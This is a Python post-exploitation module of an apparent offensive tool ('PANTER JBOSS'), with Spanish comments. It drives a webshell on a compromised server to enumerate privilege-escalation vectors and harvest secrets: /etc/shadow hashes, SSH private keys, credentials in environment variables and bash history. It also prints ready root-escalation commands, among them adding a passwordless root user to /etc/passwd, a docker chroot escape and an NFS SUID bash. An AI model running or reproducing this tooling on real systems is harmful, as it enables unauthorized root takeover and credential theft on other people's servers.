# -*- coding: utf-8 -*-
"""
PANTER JBOSS - Modulo de Privilege Escalation
Analyst : Apo1o13
Build   : 2026-04-30

Chequeo automatico de vectores de escalada de privilegios en el servidor comprometido.
Ejecuta todos los checks via webshell y presenta tabla de hallazgos con nivel de riesgo.
"""

import re
import sys

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

RED    = '\x1b[91m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
WHITE  = '\033[97m'
MAGENTA= '\033[95m'


def _p(msg, end="\n"):
    print(msg, end=end); sys.stdout.flush()


def _exec(http_pool, url, path, headers, cmd, timeout=15):
    try:
        encoded = urlencode({"ppp": cmd})
        r = http_pool.request('GET', url + path + encoded,
                              redirect=False, headers=headers)
        if r.status == 404:
            return ""
        resp = r.data.decode('utf-8', errors='ignore')
        try:
            out = resp.split("pre>")[1]
            out = re.sub(r'</?\w+[^>]*>', '', out)
            return out.replace('\\n', '\n').replace('\\t', '\t').strip()
        except:
            return ""
    except:
        return ""


def _tabla(title, headers_row, rows, color_row=WHITE):
    if not rows:
        return
    col_w = [max(len(str(h)), max((len(str(r[i])) for r in rows), default=0))
             for i, h in enumerate(headers_row)]

    def sep(l, m, r, fill="═"):
        return "  " + l + m.join(fill * (w + 2) for w in col_w) + r

    def row_str(cells, color):
        parts = " ║ ".join("{:<{w}}".format(str(c)[:col_w[i]], w=col_w[i])
                           for i, c in enumerate(cells))
        return color + "  ║ " + parts + " ║" + ENDC

    title_w = sum(col_w) + len(col_w) * 3 + 1
    _p(CYAN + BOLD + sep("╔", "╦", "╗"))
    _p(CYAN + BOLD + "  ║" + (" %s " % title).center(title_w) + "║" + ENDC)
    _p(CYAN + BOLD + sep("╠", "╬", "╣") + ENDC)
    _p(row_str(headers_row, CYAN + BOLD))
    _p(CYAN + BOLD + sep("╠", "╬", "╣") + ENDC)
    for r in rows:
        _p(row_str(r, color_row))
    _p(CYAN + BOLD + sep("╚", "╩", "╝") + ENDC + "\n")


# ══════════════════════════════════════════════════════════
#  CHECKS INDIVIDUALES
# ══════════════════════════════════════════════════════════

def _check_id(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers, "id")
    es_root = "uid=0" in out or "root" in out
    nivel = "CRITICO" if es_root else "INFO"
    return [("Usuario actual", out.split('\n')[0][:80] if out else "N/D", nivel)]


def _check_sudo(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "sudo -l 2>/dev/null || echo 'sin sudo'")
    hallazgos = []
    if not out or 'sin sudo' in out.lower() or 'no sudo' in out.lower():
        return []
    lineas = [l.strip() for l in out.split('\n') if l.strip() and 'NOPASSWD' in l.upper()]
    for l in lineas[:5]:
        hallazgos.append(("sudo NOPASSWD", l[:80], "CRITICO"))
    if not hallazgos and out:
        hallazgos.append(("sudo (con pass)", out.split('\n')[0][:80], "ALTO"))
    return hallazgos


def _check_suid(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "find / -perm -4000 -type f 2>/dev/null | grep -v proc | head -20")
    if not out:
        return []
    binarios_peligrosos = [
        'nmap','vim','vi','find','bash','sh','more','less','awk','man','python',
        'python3','perl','ruby','php','env','tee','cp','mv','wget','curl','nc',
        'ncat','netcat','cat','tail','head','screen','tmux','docker','pkexec',
    ]
    hallazgos = []
    for linea in out.split('\n'):
        linea = linea.strip()
        if not linea:
            continue
        bin_name = linea.split('/')[-1].lower()
        nivel = "CRITICO" if any(b in bin_name for b in binarios_peligrosos) else "MEDIO"
        hallazgos.append(("SUID", linea[:70], nivel))
    return hallazgos[:15]


def _check_capabilities(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "getcap -r / 2>/dev/null | head -15")
    if not out or len(out.strip()) < 3:
        return []
    caps_peligrosas = ['cap_setuid', 'cap_net_raw', 'cap_dac_override',
                       'cap_sys_admin', 'cap_sys_ptrace', 'ep']
    hallazgos = []
    for linea in out.split('\n'):
        if not linea.strip():
            continue
        nivel = "CRITICO" if any(c in linea.lower() for c in caps_peligrosas) else "ALTO"
        hallazgos.append(("Capability", linea.strip()[:70], nivel))
    return hallazgos


def _check_cron(http_pool, url, path, headers):
    cmds = [
        "cat /etc/crontab 2>/dev/null",
        "ls -la /etc/cron.* 2>/dev/null | head -10",
        "find /var/spool/cron -type f 2>/dev/null",
    ]
    hallazgos = []
    for cmd in cmds:
        out = _exec(http_pool, url, path, headers, cmd)
        if not out or len(out.strip()) < 5:
            continue
        for linea in out.split('\n'):
            if linea.strip() and not linea.startswith('#') and ('/' in linea or '*' in linea):
                hallazgos.append(("Cron job", linea.strip()[:70], "MEDIO"))
    return hallazgos[:10]


def _check_writable_paths(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "find /etc /usr/local/bin /usr/bin -writable -type f 2>/dev/null | head -10")
    if not out or len(out.strip()) < 3:
        return []
    hallazgos = []
    for linea in out.split('\n'):
        if linea.strip():
            hallazgos.append(("Writable", linea.strip()[:70], "ALTO"))
    return hallazgos


def _check_passwd_writable(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "[ -w /etc/passwd ] && echo WRITABLE || echo readonly")
    if out and 'WRITABLE' in out:
        return [("/etc/passwd escribible", "Permite agregar usuario root", "CRITICO")]
    return []


def _check_docker_lxc(http_pool, url, path, headers):
    out_id  = _exec(http_pool, url, path, headers, "id")
    out_env = _exec(http_pool, url, path, headers,
                    "cat /.dockerenv 2>/dev/null && echo DOCKER || "
                    "grep -q lxc /proc/1/cgroup 2>/dev/null && echo LXC || echo NO")
    hallazgos = []
    if out_id and 'docker' in out_id.lower():
        hallazgos.append(("Grupo docker", "Usuario en grupo docker → privesc directo", "CRITICO"))
    if out_env and 'DOCKER' in out_env:
        hallazgos.append(("Contenedor Docker", "/.dockerenv encontrado — entorno contenedor", "ALTO"))
    if out_env and 'LXC' in out_env:
        hallazgos.append(("Contenedor LXC", "cgroup lxc detectado", "ALTO"))
    return hallazgos


def _check_env_vars(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "env 2>/dev/null | grep -iE 'pass|secret|key|token|credential|pwd' | head -10")
    if not out or len(out.strip()) < 3:
        return []
    hallazgos = []
    for linea in out.split('\n'):
        if linea.strip():
            hallazgos.append(("ENV credential", linea.strip()[:70], "ALTO"))
    return hallazgos


def _check_bash_history(http_pool, url, path, headers):
    cmd = ("cat ~/.bash_history 2>/dev/null | grep -iE "
           "'pass|sudo|mysql|psql|ssh|curl.*-u|wget.*--user' | head -10")
    out = _exec(http_pool, url, path, headers, cmd)
    if not out or len(out.strip()) < 3:
        return []
    hallazgos = []
    for linea in out.split('\n'):
        if linea.strip():
            hallazgos.append(("bash_history", linea.strip()[:70], "MEDIO"))
    return hallazgos[:5]


def _check_ssh_keys(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "find /home /root -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' "
                "2>/dev/null | head -5")
    if not out or len(out.strip()) < 3:
        return []
    hallazgos = []
    for linea in out.split('\n'):
        if linea.strip():
            hallazgos.append(("SSH Private Key", linea.strip()[:70], "CRITICO"))
    return hallazgos


def _check_ldpreload(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "[ -f /etc/ld.so.preload ] && echo EXISTE || echo no")
    if out and 'EXISTE' in out:
        contenido = _exec(http_pool, url, path, headers, "cat /etc/ld.so.preload")
        return [("ld.so.preload", (contenido or "archivo vacio")[:70], "CRITICO")]
    return []


def _check_kernel(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers, "uname -r")
    if not out:
        return []
    return [("Kernel version", out.strip()[:70], "INFO")]


def _check_os_release(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2")
    if not out:
        return []
    return [("OS", out.strip()[:70], "INFO")]


def _check_passwd_shadow(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers, "cat /etc/shadow 2>/dev/null | head -5")
    if out and '$' in out:
        lineas = [l for l in out.split('\n') if '$' in l]
        return [("shadow legible", "%d hashes visibles — usar opcion [3]" % len(lineas), "CRITICO")]
    return []


def _check_nfs_exports(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers, "cat /etc/exports 2>/dev/null")
    if not out or len(out.strip()) < 3:
        return []
    for linea in out.split('\n'):
        if 'no_root_squash' in linea.lower():
            return [("NFS no_root_squash", linea.strip()[:70], "CRITICO")]
    return []


def _check_writable_service(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "find /etc/systemd /etc/init.d /etc/rc.d -writable 2>/dev/null | head -5")
    if not out or len(out.strip()) < 3:
        return []
    return [("Servicio escribible", out.split('\n')[0].strip()[:70], "CRITICO")]


# ══════════════════════════════════════════════════════════
#  SUGERENCIAS DE EXPLOTACION
# ══════════════════════════════════════════════════════════

_SUGERENCIAS = {
    "sudo NOPASSWD": [
        "sudo <binario> /bin/bash  → shell root directo",
        "GTFOBins: https://gtfobins.github.io/",
    ],
    "SUID": [
        "GTFOBins: find/<bin> privesc → https://gtfobins.github.io/",
        "find / -perm -4000 -exec /bin/bash -p \\; (si find es SUID)",
    ],
    "Capability": [
        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "cap_setuid+ep → setUID root directo",
    ],
    "/etc/passwd escribible": [
        "echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd",
        "su pwned  → shell root sin password",
    ],
    "shadow legible": [
        "Copiar hashes y crackear con John/Hashcat (opcion [3] o [h])",
    ],
    "Grupo docker": [
        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    ],
    "NFS no_root_squash": [
        "mount -o rw <target>:/share /mnt && cp /bin/bash /mnt && chmod +s /mnt/bash",
        "/mnt/bash -p → root",
    ],
    "ld.so.preload": [
        "Compilar .so malicioso e inyectar en /etc/ld.so.preload",
    ],
    "Writable": [
        "Reemplazar binario con payload de privesc",
    ],
}


def _mostrar_sugerencias(hallazgos):
    tipos_criticos = set(h[0] for h in hallazgos if h[2] == "CRITICO")
    if not tipos_criticos:
        return

    _p(MAGENTA + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║         VECTORES DE ESCALADA DETECTADOS                  ║\n"
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    for tipo in tipos_criticos:
        sugs = _SUGERENCIAS.get(tipo, [])
        if not sugs:
            # buscar por prefijo
            for k, v in _SUGERENCIAS.items():
                if k in tipo or tipo in k:
                    sugs = v
                    break
        if not sugs:
            continue
        _p(RED + BOLD + "  [!] %s:" % tipo + ENDC)
        for s in sugs:
            _p(YELLOW + "      → " + s + ENDC)
        _p("")


# ══════════════════════════════════════════════════════════
#  PUNTO DE ENTRADA
# ══════════════════════════════════════════════════════════

def ejecutar_privesc(http_pool, url, path, headers):
    """
    Ejecuta todos los checks de privesc y presenta tabla de hallazgos.
    Retorna lista de hallazgos: [(nombre, detalle, nivel), ...]
    """
    _p(RED + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║       ANALISIS DE PRIVILEGE ESCALATION                   ║\n"
       "  ║  " + url[:54].ljust(54) + "║\n"
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    checks = [
        ("ID / usuario actual",      _check_id),
        ("sudo -l",                  _check_sudo),
        ("SUID binarios",            _check_suid),
        ("Capabilities",             _check_capabilities),
        ("Cron jobs",                _check_cron),
        ("Archivos escribibles",     _check_writable_paths),
        ("/etc/passwd escribible",   _check_passwd_writable),
        ("Docker / LXC",             _check_docker_lxc),
        ("Variables de entorno",     _check_env_vars),
        ("bash_history",             _check_bash_history),
        ("SSH Private Keys",         _check_ssh_keys),
        ("LD_PRELOAD / ld.so",       _check_ldpreload),
        ("NFS exports",              _check_nfs_exports),
        ("Servicios escribibles",    _check_writable_service),
        ("/etc/shadow legible",      _check_passwd_shadow),
        ("Kernel version",           _check_kernel),
        ("OS Release",               _check_os_release),
    ]

    todos_hallazgos = []

    for nombre, fn in checks:
        _p(CYAN + "  [*] Chequeando %-35s" % (nombre + "...") + ENDC, end='')
        try:
            resultado = fn(http_pool, url, path, headers)
        except Exception as e:
            resultado = []
        if resultado:
            n_criticos = sum(1 for _, _, nivel in resultado if nivel == "CRITICO")
            if n_criticos:
                _p(RED + BOLD + " %d CRITICO(S)" % n_criticos + ENDC)
            else:
                _p(YELLOW + " %d hallazgo(s)" % len(resultado) + ENDC)
            todos_hallazgos.extend(resultado)
        else:
            _p(GREEN + " OK" + ENDC)

    _p("")

    if not todos_hallazgos:
        _p(GREEN + BOLD + "  [+] Sin vectores de privesc evidentes detectados.\n" + ENDC)
        return todos_hallazgos

    # Ordenar: CRITICO primero
    orden = {"CRITICO": 0, "ALTO": 1, "MEDIO": 2, "INFO": 3}
    todos_hallazgos.sort(key=lambda x: orden.get(x[2], 9))

    # Colorear nivel en tabla
    rows = []
    for nombre, detalle, nivel in todos_hallazgos:
        if nivel == "CRITICO":
            nivel_c = RED + BOLD + nivel + ENDC
        elif nivel == "ALTO":
            nivel_c = YELLOW + nivel + ENDC
        elif nivel == "MEDIO":
            nivel_c = CYAN + nivel + ENDC
        else:
            nivel_c = WHITE + nivel + ENDC
        rows.append([nombre, detalle[:65], nivel_c])

    _tabla("PRIVILEGE ESCALATION — " + url,
           ["VECTOR", "DETALLE", "RIESGO"], rows, color_row=WHITE)

    # Resumen
    criticos = sum(1 for _, _, n in todos_hallazgos if n == "CRITICO")
    altos    = sum(1 for _, _, n in todos_hallazgos if n == "ALTO")
    _p(RED + BOLD + "  [!] Resumen: %d CRITICOS, %d ALTOS, %d total.\n" % (
        criticos, altos, len(todos_hallazgos)) + ENDC)

    _mostrar_sugerencias(todos_hallazgos)

    return todos_hallazgos
